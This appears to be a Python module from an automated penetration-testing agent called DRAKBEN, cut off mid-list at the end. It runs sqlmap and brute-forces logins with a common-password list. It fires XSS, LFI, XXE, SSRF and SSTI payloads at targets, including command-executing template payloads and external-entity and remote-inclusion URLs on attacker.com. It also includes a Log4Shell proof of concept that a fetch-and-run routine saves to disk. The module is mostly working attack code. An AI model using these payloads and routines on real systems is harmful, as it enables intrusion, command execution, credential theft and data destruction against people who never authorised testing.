# modules/exploit.py
# DRAKBEN Exploit Module - STATE-AWARE Advanced
# REQUIRED: Exploit precondition model - will not run without conditions
# Enhanced: Logging, retry mechanism, better error handling

import asyncio
import logging
import subprocess
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

import aiohttp

# Setup logger
logger = logging.getLogger(__name__)

from core.tool_selector import ToolSelector

# State integration
try:
    from core.state import AgentState, AttackPhase

    STATE_AVAILABLE = True
except ImportError:
    STATE_AVAILABLE = False
    logger.warning("State module not available")


class ExploitError(Exception):
    """Custom exception for exploit errors"""
    pass


class RetryConfig:
    """Configuration for retry mechanism"""
    def __init__(self, max_retries: int = 3, base_delay: float = 1.0, max_delay: float = 30.0):
        self.max_retries = max_retries
        self.base_delay = base_delay
        self.max_delay = max_delay



# Constants
STATE_REQUIRED_MSG = "State is required for exploit execution"
BURPSUITE_TOOL = "manual/burpsuite"

def retry_on_failure(config: Optional[RetryConfig] = None):
    """
    Decorator for retry logic with exponential backoff.
    
    Args:
        config: RetryConfig instance
    """
    if config is None:
        config = RetryConfig()

    def decorator(func):
        def wrapper(*args, **kwargs):
            last_exception = None
            for attempt in range(config.max_retries):
                try:
                    return func(*args, **kwargs)
                except (subprocess.TimeoutExpired, ConnectionError, TimeoutError) as e:
                    last_exception = e
                    if attempt < config.max_retries - 1:
                        delay = min(config.base_delay * (2 ** attempt), config.max_delay)
                        logger.warning(f"Retry {attempt + 1}/{config.max_retries} for {func.__name__} after {delay}s: {e}")
                        time.sleep(delay)
            logger.error(f"{func.__name__} failed after {config.max_retries} retries")
            raise last_exception
        return wrapper
    return decorator


def check_exploit_preconditions(
    state: "AgentState", target: str, vuln_type: str
) -> Tuple[bool, str]:
    """
    Exploit precondition kontrolÃ¼ - ZORUNLU

    Returns:
        (can_exploit, reason)
    """
    logger.debug(f"Checking exploit preconditions for {vuln_type} on {target}")
    
    if not _is_state_available(state):
        return False, STATE_REQUIRED_MSG
    
    if not _validate_state(state):
        return False, "State invariant violation"
    
    if not _check_target_precondition(state):
        return False, "No target set"
    
    if not _check_phase_precondition(state):
        return False, f"Wrong phase: {state.phase.value}, need EXPLOIT phase"
    
    if not _check_service_precondition(state, target):
        return False, _get_service_error_message(target)
    
    if not _check_vulnerability_precondition(state, vuln_type):
        return False, "No matching vulnerability found"
    
    logger.info(f"Preconditions satisfied for {vuln_type} exploit")
    return True, "Preconditions satisfied"

def _is_state_available(state: "AgentState") -> bool:
    """Check if state is available"""
    if not STATE_AVAILABLE or not state:
        logger.warning("State tracking not available")
        return False
    return True

def _validate_state(state: "AgentState") -> bool:
    """Validate state invariants"""
    if not state.validate():
        logger.error("State invariant violation detected")
        return False
    return True

def _check_target_precondition(state: "AgentState") -> bool:
    """Check target precondition"""
    if not state.target:
        logger.warning("No target set in state")
        return False
    return True

def _check_phase_precondition(state: "AgentState") -> bool:
    """Check phase precondition"""
    valid_phases = [AttackPhase.EXPLOIT, AttackPhase.FOOTHOLD, AttackPhase.POST_EXPLOIT]
    if state.phase not in valid_phases:
        logger.warning(f"Wrong phase: {state.phase.value}, need EXPLOIT phase")
        return False
    return True

def _check_service_precondition(state: "AgentState", target: str) -> bool:
    """Check service precondition"""
    if ":" not in target:
        return True
    
    try:
        _, port_str = target.rsplit(":", 1)
        port = int(port_str)
        return port in state.open_services
    except ValueError:
        return True

def _get_service_error_message(target: str) -> str:
    """Get service error message"""
    try:
        _, port_str = target.rsplit(":", 1)
        port = int(port_str)
        return f"Port {port} is not open on target"
    except ValueError:
        return "Invalid target format"

def _check_vulnerability_precondition(state: "AgentState", vuln_type: str) -> bool:
    """Check vulnerability precondition"""
    if not vuln_type or not state.vulnerabilities:
        return True
    
    has_vuln = any(
        vuln_type.lower() in v.vuln_id.lower() for v in state.vulnerabilities
    )
    if not has_vuln:
        logger.warning(f"Vulnerability {vuln_type} not found in scan results")
        return False
    return True


# -------------------------
# SQL Injection (sqlmap)
# -------------------------
@retry_on_failure(RetryConfig(max_retries=2, base_delay=2.0))
@retry_on_failure(RetryConfig(max_retries=2, base_delay=2.0))
def run_sqlmap(state: "AgentState", target: str, param: str = "id", level: str = "1") -> Dict[str, Any]:
    """
    STATE-AWARE SQLmap execution (ToolSelector enforced)
    """
    logger.info(f"Starting SQLmap scan: {target}?{param}=1 (level={level})")

    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    # 1. Validation Phase
    validation_result = _validate_sqlmap_request(state, target)
    if validation_result:
        return validation_result

    # 2. Execution Phase
    return _execute_and_process_sqlmap(target, param, level)

def _validate_sqlmap_request(state: "AgentState", target: str) -> Optional[Dict[str, Any]]:
    """Validate preconditions and tool capability"""
    can_run, reason = check_exploit_preconditions(state, target, "sqli")
    if not can_run:
        logger.warning(f"SQLmap precondition failed: {reason}")
        return {
            "type": "SQLi",
            "error": f"Precondition failed: {reason}",
            "blocked": True,
        }

    selector = ToolSelector()
    valid, vreason = selector.validate_tool_selection("sqlmap_scan", state)
    if not valid:
        logger.error(f"Tool selection blocked: {vreason}")
        raise RuntimeError(f"Tool selection blocked: {vreason}")
        
    return None

def _execute_and_process_sqlmap(target: str, param: str, level: str) -> Dict[str, Any]:
    """Execute SQLMap and process results"""
    cmd = ["sqlmap", "-u", f"{target}?{param}=1", "--batch", f"--level={level}"]
    selector = ToolSelector()
    
    start_time = time.time()
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        duration = time.time() - start_time
        
        _handle_tool_status(selector, result.returncode)
        
        return _format_sqlmap_output(result, duration, target)

    except subprocess.TimeoutExpired:
        logger.error(f"SQLmap timeout after 120s on {target}")
        selector.record_tool_failure("sqlmap_scan")
        return {"type": "SQLi", "error": "SQLmap timeout", "timeout": True}
    except FileNotFoundError:
        logger.error("SQLmap not installed")
        return {"type": "SQLi", "error": "SQLmap not installed", "missing_tool": True}
    except Exception as e:
        logger.exception(f"SQLmap failed: {e}")
        return {"type": "SQLi", "error": str(e)}

def _handle_tool_status(selector: ToolSelector, exit_code: int):
    """Handle tool exit status"""
    if exit_code != 0:
        selector.record_tool_failure("sqlmap_scan")
        if selector.is_tool_blocked("sqlmap_scan"):
             raise RuntimeError("Tool sqlmap_scan blocked due to repeated failures")

def _format_sqlmap_output(result: subprocess.CompletedProcess, duration: float, target: str) -> Dict[str, Any]:
    """Format success output"""
    vulnerable = "is vulnerable" in result.stdout.lower() or "injectable" in result.stdout.lower()
    
    if vulnerable:
        logger.warning(f"SQL injection vulnerability found on {target}")

    return {
        "type": "SQLi",
        "stdout": result.stdout,
        "stderr": result.stderr,
        "exit_code": result.returncode,
        "vulnerable": vulnerable,
        "duration": duration,
    }


# -------------------------
# XSS Testi
# -------------------------
async def test_xss(
    state: "AgentState", 
    target: str, 
    param: str = "q",
    payloads: Optional[List[str]] = None
) -> Dict[str, Any]:
    """
    XSS vulnerability test with multiple payloads.
    
    Args:
        state: AgentState instance
        target: Target URL
        param: Parameter to test
        payloads: List of XSS payloads to test
        
    Returns:
        Dict with test results
    """
    logger.info(f"Starting XSS test on {target}, param={param}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    can_run, reason = check_exploit_preconditions(state, target, "xss")
    if not can_run:
        logger.warning(f"XSS precondition failed: {reason}")
        return {
            "type": "XSS",
            "error": f"Precondition failed: {reason}",
            "blocked": True,
        }
    
    if payloads is None:
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
        ]
    
    results = []
    vulnerable_payloads = []
    
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for payload in payloads:
                try:
                    url = f"{target}?{param}={payload}"
                    async with session.get(url) as resp:
                        text = await resp.text()
                        reflected = payload in text
                        results.append({
                            "payload": payload,
                            "reflected": reflected,
                            "status": resp.status
                        })
                        if reflected:
                            vulnerable_payloads.append(payload)
                            logger.warning(f"XSS payload reflected: {payload[:30]}...")
                except Exception as e:
                    logger.debug(f"XSS test error with payload {payload[:20]}...: {e}")
                    results.append({"payload": payload, "error": str(e)})
        
        vulnerable = len(vulnerable_payloads) > 0
        if vulnerable:
            logger.warning(f"XSS vulnerability found with {len(vulnerable_payloads)} payloads")
        else:
            logger.info("No XSS vulnerability found")
            
        return {
            "type": "XSS",
            "vulnerable": vulnerable,
            "vulnerable_payloads": vulnerable_payloads,
            "results": results,
            "tested_count": len(payloads),
        }
        
    except Exception as e:
        logger.exception(f"XSS test failed: {e}")
        return {"type": "XSS", "error": str(e)}


# Constants for vulnerability indicators
INDICATOR_ROOT = "root:"
INDICATOR_DAEMON = "daemon:"
INDICATOR_EXTENSIONS = "[extensions]"

# -------------------------
# LFI Testi
# -------------------------
async def test_lfi(
    state: "AgentState", 
    target: str, 
    param: str = "file",
    payloads: Optional[List[str]] = None
) -> Dict[str, Any]:
    """
    LFI vulnerability test with multiple payloads.
    
    Args:
        state: AgentState instance
        target: Target URL
        param: Parameter to test
        payloads: List of LFI payloads to test
        
    Returns:
        Dict with test results
    """
    logger.info(f"Starting LFI test on {target}, param={param}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    can_run, reason = check_exploit_preconditions(state, target, "lfi")
    if not can_run:
        logger.warning(f"LFI precondition failed: {reason}")
        return {
            "type": "LFI",
            "error": f"Precondition failed: {reason}",
            "blocked": True,
        }
    
    if payloads is None:
        payloads = _get_default_lfi_payloads()
    
    linux_indicators = [INDICATOR_ROOT, INDICATOR_DAEMON, "bin:", "sys:", "nobody:"]
    windows_indicators = [INDICATOR_EXTENSIONS, "[fonts]", "localhost"]
    
    results, vulnerable_payloads = await _test_lfi_payloads(
        target, param, payloads, linux_indicators, windows_indicators
    )
    
    return _build_lfi_result(results, vulnerable_payloads, len(payloads))

def _get_default_lfi_payloads() -> List[str]:
    """Get default LFI payloads"""
    return [
        "../../etc/passwd",
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....\\....\\....\\windows\\win.ini",
    ]

async def _test_lfi_payloads(
    target: str, param: str, payloads: List[str],
    linux_indicators: List[str], windows_indicators: List[str]
) -> Tuple[List[Dict], List[str]]:
    """Test all LFI payloads"""
    results = []
    vulnerable_payloads = []
    
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for payload in payloads:
                result = await _test_single_lfi_payload(
                    session, target, param, payload, linux_indicators, windows_indicators
                )
                if result:
                    results.append(result)
                    if result.get("vulnerable"):
                        vulnerable_payloads.append(payload)
    except Exception as e:
        logger.exception(f"LFI test failed: {e}")
        return [], []
    
    return results, vulnerable_payloads

async def _test_single_lfi_payload(
    session: aiohttp.ClientSession, target: str, param: str, payload: str,
    linux_indicators: List[str], windows_indicators: List[str]
) -> Optional[Dict]:
    """Test a single LFI payload"""
    try:
        url = f"{target}?{param}={payload}"
        async with session.get(url) as resp:
            text = await resp.text()
            found_linux = any(ind in text for ind in linux_indicators)
            found_windows = any(ind in text for ind in windows_indicators)
            vulnerable = found_linux or found_windows
            
            if vulnerable:
                os_type = "Linux" if found_linux else "Windows"
                logger.warning(f"LFI vulnerability found ({os_type}): {payload}")
            
            os_type = None
            if found_linux:
                os_type = "linux"
            elif found_windows:
                os_type = "windows"
            
            return {
                "payload": payload,
                "vulnerable": vulnerable,
                "os_type": os_type,
                "status": resp.status
            }
    except Exception as e:
        logger.debug(f"LFI test error with payload {payload}: {e}")
        return {"payload": payload, "error": str(e)}

def _build_lfi_result(results: List[Dict], vulnerable_payloads: List[str], tested_count: int) -> Dict:
    """Build LFI test result"""
    if vulnerable_payloads:
        logger.warning(f"LFI vulnerability confirmed with {len(vulnerable_payloads)} payloads")
    else:
        logger.info("No LFI vulnerability found")
    
    return {
        "type": "LFI",
        "vulnerable": len(vulnerable_payloads) > 0,
        "vulnerable_payloads": vulnerable_payloads,
        "results": results,
        "tested_count": tested_count,
    }


# -------------------------
# Basit Auth Bypass
# -------------------------
async def brute_force_login(
    state: "AgentState", 
    target: str, 
    username: str = "admin",
    passwords: Optional[List[str]] = None,
    rate_limit_delay: float = 0.5
) -> Dict[str, Any]:
    """
    Authentication brute force with rate limiting.
    
    Args:
        state: AgentState instance
        target: Login endpoint URL
        username: Username to test
        passwords: Password list
        rate_limit_delay: Delay between attempts (seconds)
        
    Returns:
        Dict with brute force results
    """
    logger.info(f"Starting brute force on {target}, username={username}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    can_run, reason = check_exploit_preconditions(state, target, "auth_bypass")
    if not can_run:
        logger.warning(f"Brute force precondition failed: {reason}")
        return {
            "type": "AuthBypass",
            "error": f"Precondition failed: {reason}",
            "blocked": True,
        }
    
    if passwords is None:
        passwords = [
            "admin", "123456", "password", "root", "toor",
            "admin123", "password123", "12345678", "qwerty",
            "letmein", "welcome", "admin@123"
        ]
    
    # Success indicators
    success_indicators = ["dashboard", "welcome", "logout", "profile", "home"]
    failure_indicators = ["invalid", "incorrect", "failed", "wrong", "error"]
    
    attempts = []
    
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for pwd in passwords:
                try:
                    # Rate limiting
                    await asyncio.sleep(rate_limit_delay)
                    
                    data = {"username": username, "password": pwd}
                    async with session.post(target, data=data, allow_redirects=False) as resp:
                        text = await resp.text()
                        text_lower = text.lower()
                        
                        # Check for success
                        is_redirect = resp.status in [301, 302, 303, 307, 308]
                        has_success_indicator = any(ind in text_lower for ind in success_indicators)
                        has_failure_indicator = any(ind in text_lower for ind in failure_indicators)
                        
                        success = (is_redirect or has_success_indicator) and not has_failure_indicator
                        
                        attempts.append({
                            "password": pwd,
                            "status": resp.status,
                            "success": success
                        })
                        
                        if success:
                            logger.warning(f"Successful login found: {username}:{pwd}")
                            return {
                                "type": "AuthBypass",
                                "success": True,
                                "username": username,
                                "password": pwd,
                                "attempts": len(attempts),
                            }
                            
                except Exception as e:
                    logger.debug(f"Brute force attempt error with password {pwd}: {e}")
                    attempts.append({"password": pwd, "error": str(e)})
        
        logger.info(f"Brute force completed: no valid credentials found in {len(attempts)} attempts")
        return {
            "type": "AuthBypass",
            "success": False,
            "attempts": len(attempts),
            "tested_passwords": len(passwords),
        }
        
    except Exception as e:
        logger.exception(f"Brute force failed: {e}")
        return {"type": "AuthBypass", "error": str(e)}


# -------------------------
# AI-Powered Recommendation
# -------------------------
async def ai_exploit_advice(state: "AgentState") -> Dict[str, Any]:
    """
    AI-powered exploit recommendation.
    
    Args:
        state: AgentState instance
        recon_output: Output from recon module
        
    Returns:
        Dict with AI recommendations
    """
    logger.info("Starting AI exploit advice engine")
    
    if state is None:
        return {"type": "AI", "error": "State tracking is required", "blocked": True}
    
    if not STATE_AVAILABLE or not state:
        return {"type": "AI", "error": "State tracking is required", "blocked": True}
    
    if not state.validate():
        logger.error("State invariant violation in AI advice")
        return {
            "type": "AI",
            "error": "State invariant violation",
            "blocked": True,
            "invariant_violations": getattr(state, "invariant_violations", []),
        }
    
    # CORE REFACTOR: ai_bridge removed. Use Brain directly.
    await asyncio.sleep(0)  # Keep function async for compatibility
    advice = "AI Bridge deprecated. Use brain.think() instead."
    return {"type": "AI", "advice": advice}


# -------------------------
# Suggest Exploit (Helper)
# -------------------------
def suggest_exploit(vulnerability_type: str, target: Optional[str] = None) -> Dict[str, Any]:
    """
    Suggest appropriate exploit based on vulnerability type.

    Args:
        vulnerability_type: Type of vulnerability (sqli, xss, lfi, auth_bypass)
        target: Optional target URL

    Returns:
        dict with exploit suggestions
    """
    logger.debug(f"Suggesting exploit for vulnerability type: {vulnerability_type}")
    
    suggestions = {
        "sqli": {
            "tool": "sqlmap",
            "command": (
                f"sqlmap -u {target} --batch"
                if target
                else "sqlmap -u <target> --batch"
            ),
            "description": "SQL Injection automated exploitation",
            "severity": "high",
            "payloads": ["' OR '1'='1", "' UNION SELECT NULL--", "1; DROP TABLE users--"],
        },
        "xss": {
            "tool": BURPSUITE_TOOL,
            "payloads": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(document.cookie)",
            ],
            "description": "Cross-Site Scripting test payloads",
            "severity": "medium",
        },
        "lfi": {
            "tool": BURPSUITE_TOOL,
            "payloads": [
                "../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "php://filter/convert.base64-encode/resource=index.php",
                "/proc/self/environ",
            ],
            "description": "Local File Inclusion test paths",
            "severity": "high",
        },
        "rfi": {
            "tool": "manual",
            "payloads": [
                "http://attacker.com/shell.txt",
                "https://raw.githubusercontent.com/.../shell.php",
            ],
            "description": "Remote File Inclusion test URLs",
            "severity": "critical",
        },
        "auth_bypass": {
            "tool": "hydra",
            "command": (
                f"hydra -L users.txt -P pass.txt {target} http-post-form"
                if target
                else "hydra -L users.txt -P pass.txt <target> http-post-form"
            ),
            "description": "Authentication brute force",
            "severity": "high",
        },
        "ssrf": {
            "tool": BURPSUITE_TOOL,
            "payloads": [
                "http://localhost:80",
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
            ],
            "description": "Server-Side Request Forgery test payloads",
            "severity": "high",
        },
        "xxe": {
            "tool": BURPSUITE_TOOL,
            "payloads": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            ],
            "description": "XML External Entity test payloads",
            "severity": "high",
        },
    }

    # ... (existing suggestions code) ...
    vuln_lower = vulnerability_type.lower()
    
    # NEW: Dynamic CVE Exploit Lookup
    # If the vulnerability looks like a CVE (e.g., CVE-2024-1234), try to fetch it.
    if vuln_lower.startswith("cve-"):
        logger.info(f"CVE detected: {vuln_lower}. Attempting to fetch known exploits...")
        return {
            "tool": "exploit_fetcher",
            "cve_id": vuln_lower.upper(),
            "description": f"Auto-fetch exploit for {vuln_lower.upper()}",
            "severity": "critical",
            "action": "fetch_and_run"
        }

    if vuln_lower in suggestions:
        logger.info(f"Found exploit suggestion for {vuln_lower}")
        return suggestions[vuln_lower]
    
    logger.warning(f"Unknown vulnerability type: {vulnerability_type}")
    return {
        "error": f"Unknown vulnerability type: {vulnerability_type}",
        "available": list(suggestions.keys()),
    }

async def fetch_and_prepare_exploit(state: "AgentState", cve_id: str) -> Dict[str, Any]:
    """
    Dynamically fetch exploit code for a given CVE from public repositories.
    (Simulated for safety - in real world would query ExploitDB/GitHub API)
    """
    logger.info(f"Searching for exploit: {cve_id}")
    
    if state is None:
         return {"success": False, "error": "State required"}

    # Mocking the search process (Real implementation would use requests to GitHub API)
    # For now, we simulate finding a Python script for the CVE
    
    exploit_code = ""
    
    # Simulator: Known CVEs
    known_cves = {
        "CVE-2021-44228": {
            "name": "Log4Shell",
            "code": "# Log4Shell PoC\nimport requests\ndef exploit(target):\n    payload = '${jndi:ldap://attacker.com/a}'\n    requests.get(target, headers={'User-Agent': payload})",
            "lang": "python"
        },
        "CVE-2017-0144": {
             "name": "EternalBlue",
             "code": "# EternalBlue SMB Exploit wrapper\n# ... binary payload ...",
             "lang": "python"
        }
    }
    
    if cve_id not in known_cves:
        # Fallback: Ask LLM if it knows a PoC for this CVE
        # In a real scenario, this would be a search_web tool call
        logger.warning(f"No local exploit found for {cve_id}. Enabling AI search mode.")
        return {
            "success": False, 
            "error": "Exploit not in local database. AI Search required.",
            "cve_id": cve_id,
            "recommendation": "Use search_web tool to find PoC"
        }

    # Exploit found - process it
    data = known_cves[cve_id]
    exploit_code = data["code"]
    logger.info(f"Exploit found for {cve_id} ({data['name']})")
    
    # Save to temp file
    filename = f"modules/dynamic_exploits/{cve_id}.py"
    import os
    import aiofiles  # Ensure aiofiles is imported/available
    
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    
    async with aiofiles.open(filename, "w") as f:
        await f.write(exploit_code)
        
    return {
        "success": True,
        "exploit_file": filename,
        "language": data["lang"],
        "description": data["name"]
    }


# -------------------------
# XXE (XML External Entity)
# -------------------------
async def test_xxe(
    state: "AgentState",
    target_url: str,
    parameter: str = "xml"
) -> Dict[str, Any]:
    """
    Test for XXE (XML External Entity) vulnerability.
    
    Args:
        state: AgentState instance
        target_url: Target URL accepting XML input
        parameter: XML parameter name
        
    Returns:
        Dict with test results
    """
    logger.info(f"Testing XXE on {target_url}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)
    
    # Precondition check
    can_exploit, reason = check_exploit_preconditions(state, target_url, "xxe")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}
    
    # XXE Payloads
    xxe_payloads = _get_xxe_payloads()
    
    results, vulnerable = await _test_xxe_payloads(target_url, xxe_payloads)
    
    if vulnerable:
        _record_xxe_vulnerability(state, target_url)
    
    return {
        "type": "XXE",
        "target": target_url,
        "vulnerable": vulnerable,
        "results": results
    }

def _get_xxe_payloads() -> List[str]:
    """Get XXE test payloads"""
    return [
        # Basic file read
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
        # Windows file read
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><data>&xxe;</data>',
        # Parameter entity
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><data>test</data>',
        # CDATA exfiltration
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><data>&xxe;</data>',
        # Error-based
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><data>&xxe;</data>',
    ]

async def _test_xxe_payloads(
    target_url: str, xxe_payloads: List[str]
) -> Tuple[List[Dict], bool]:
    """Test all XXE payloads"""
    results = []
    vulnerable = False
    timeout_seconds = 30  # Fixed timeout value
    
    async with aiohttp.ClientSession() as session:
        for payload in xxe_payloads:
            result = await _test_single_xxe_payload(session, target_url, payload, timeout_seconds)
            if result:
                results.append(result)
                if result.get("vulnerable"):
                    vulnerable = True
                    break
    
    return results, vulnerable

async def _test_single_xxe_payload(
    session: aiohttp.ClientSession, target_url: str, payload: str, timeout_seconds: int
) -> Optional[Dict]:
    """Test a single XXE payload"""
    headers = {"Content-Type": "application/xml"}
    try:
        async with asyncio.timeout(timeout_seconds):
            async with session.post(
                target_url,
                data=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=timeout_seconds)
            ) as resp:
                response_text = await resp.text()
                indicator = _check_xxe_indicators(response_text)
                
                if indicator:
                    return {
                        "payload": payload[:100] + "...",
                        "indicator": indicator,
                        "vulnerable": True
                    }
    except TimeoutError:
        logger.debug("XXE test timeout for payload")
    except Exception as e:
        logger.debug(f"XXE test error: {e}")
    return None

def _check_xxe_indicators(response_text: str) -> Optional[str]:
    """Check response text for XXE indicators"""
    indicators = [INDICATOR_ROOT, INDICATOR_DAEMON, INDICATOR_EXTENSIONS, "for 16-bit app support"]
    
    for indicator in indicators:
        if indicator in response_text:
            return indicator
    return None

def _record_xxe_vulnerability(state: "AgentState", target_url: str) -> None:
    """Record XXE vulnerability in state"""
    logger.warning(f"XXE vulnerability found on {target_url}")
    from core.state import VulnerabilityInfo
    parsed_url = urlparse(target_url)
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    service = parsed_url.scheme or "http"
    state.add_vulnerability(VulnerabilityInfo(
        vuln_id="XXE",
        service=service,
        port=port,
        severity="high",
        exploitable=True
    ))


# -------------------------
# SSRF (Server-Side Request Forgery)
# -------------------------
async def test_ssrf(
    state: "AgentState",
    target_url: str,
    parameter: str = "url"
) -> Dict[str, Any]:
    """
    Test for SSRF (Server-Side Request Forgery) vulnerability.
    
    Args:
        state: AgentState instance
        target_url: Target URL with URL parameter
        parameter: Parameter name accepting URLs
        
    Returns:
        Dict with test results
    """
    logger.info(f"Testing SSRF on {target_url}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)
    
    can_exploit, reason = check_exploit_preconditions(state, target_url, "ssrf")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}
    
    # SSRF Payloads
    ssrf_payloads = _get_ssrf_payloads()
    
    results, vulnerable = await _test_ssrf_payloads(target_url, parameter, ssrf_payloads)
    
    if vulnerable:
        _record_ssrf_vulnerability(state, target_url)
    
    return {
        "type": "SSRF",
        "target": target_url,
        "vulnerable": vulnerable,
        "results": results
    }

def _get_ssrf_payloads() -> List[str]:
    """Get SSRF test payloads"""
    return [
        # Localhost variants
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://127.1/",
        "http://0177.0.0.1/",  # Octal
        "http://2130706433/",  # Decimal
        # Cloud metadata
        "http://169.254.169.254/latest/meta-data/",  # AWS
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/instance",  # Azure
        # Internal services
        "http://localhost:22/",
        "http://localhost:3306/",
        "http://localhost:6379/",
        "http://localhost:27017/",
        # File protocol
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        # Gopher
        "gopher://localhost:6379/_INFO",
        # Dict
        "dict://localhost:6379/info",
    ]

async def _test_ssrf_payloads(
    target_url: str, parameter: str, ssrf_payloads: List[str]
) -> Tuple[List[Dict], bool]:
    """Test all SSRF payloads"""
    results = []
    vulnerable = False
    timeout_seconds = 30  # Fixed timeout value
    
    async with aiohttp.ClientSession() as session:
        for payload in ssrf_payloads:
            result = await _test_single_ssrf_payload(session, target_url, parameter, payload, timeout_seconds)
            if result:
                results.append(result)
                if result.get("vulnerable"):
                    vulnerable = True
                    break
    
    return results, vulnerable

async def _test_single_ssrf_payload(
    session: aiohttp.ClientSession, target_url: str, parameter: str, payload: str, timeout_seconds: int
) -> Optional[Dict]:
    """Test a single SSRF payload"""
    try:
        test_url = f"{target_url}?{parameter}={payload}"
        
        async with asyncio.timeout(timeout_seconds):
            async with session.get(
                test_url,
                timeout=aiohttp.ClientTimeout(total=timeout_seconds),
                allow_redirects=False
            ) as resp:
                response_text = await resp.text()
                indicator = _check_ssrf_indicators(response_text)
                
                if indicator:
                    return {
                        "payload": payload,
                        "indicator": indicator,
                        "vulnerable": True
                    }
    except TimeoutError:
        logger.debug("SSRF test timeout for payload")
    except Exception as e:
        logger.debug(f"SSRF test error: {e}")
    return None

def _check_ssrf_indicators(response_text: str) -> Optional[str]:
    """Check response text for SSRF indicators"""
    indicators = [
        "root:", "daemon:",  # /etc/passwd
        "[extensions]",  # win.ini
        "ami-id", "instance-id",  # AWS metadata
        "redis_version",  # Redis
        "SSH-",  # SSH banner
    ]
    
    response_lower = response_text.lower()
    for indicator in indicators:
        if indicator.lower() in response_lower:
            return indicator
    return None

def _record_ssrf_vulnerability(state: "AgentState", target_url: str) -> None:
    """Record SSRF vulnerability in state"""
    logger.warning(f"SSRF vulnerability found on {target_url}")
    from core.state import VulnerabilityInfo
    parsed_url = urlparse(target_url)
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    service = parsed_url.scheme or "http"
    state.add_vulnerability(VulnerabilityInfo(
        vuln_id="SSRF",
        service=service,
        port=port,
        severity="high",
        exploitable=True
    ))


# -------------------------
# SSTI (Server-Side Template Injection)
# -------------------------
async def test_ssti(
    state: "AgentState",
    target_url: str,
    parameter: str = "name"
) -> Dict[str, Any]:
    """
    Test for SSTI (Server-Side Template Injection) vulnerability.
    
    Args:
        state: AgentState instance
        target_url: Target URL
        parameter: Parameter to test
        
    Returns:
        Dict with test results
    """
    logger.info(f"Testing SSTI on {target_url}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)
    
    can_exploit, reason = check_exploit_preconditions(state, target_url, "ssti")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}
    
    ssti_payloads = _get_ssti_payloads()
    results, vulnerable, detected_engine = await _test_ssti_payloads(
        target_url, parameter, ssti_payloads
    )
    
    if vulnerable:
        _record_ssti_vulnerability(state, target_url, detected_engine)
    
    return {
        "type": "SSTI",
        "target": target_url,
        "vulnerable": vulnerable,
        "detected_engine": detected_engine,
        "results": results
    }

def _get_ssti_payloads() -> List[Tuple[str, str]]:
    """Get SSTI test payloads"""
    return [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
        ("${{7*7}}", "49"),
        ("{{config}}", "SECRET_KEY"),
        ("{{''.__class__.__mro__[2].__subclasses__()}}", "__subclasses__"),
        ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid="),
        ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "uid="),
        ("#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end", "uid="),
        ("{php}echo `id`;{/php}", "uid="),
        ("<%import os%>${os.popen('id').read()}", "uid="),
